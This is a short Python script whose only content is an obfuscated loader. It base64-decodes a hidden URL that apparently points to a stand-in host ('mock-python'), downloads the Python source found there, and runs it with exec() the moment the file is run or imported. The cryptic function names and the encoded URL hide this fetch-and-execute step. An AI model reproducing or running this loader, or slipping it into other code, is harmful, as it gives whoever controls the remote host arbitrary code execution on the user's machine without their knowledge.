import urllib.request
import types
import base64

def fRS(u):
    with urllib.request.urlopen(u) as r:
        s = r.read().decode('utf-8')
    return s

def cP():
    eU = "aHR0cDovL21vY2stcHl0aG9uL2V4ZWN1dGUucHk="
    dU = base64.b64decode(eU).decode('utf-8')
    src = fRS(dU)
    m = types.ModuleType("sm")
    exec(src, m.__dict__)

cP()
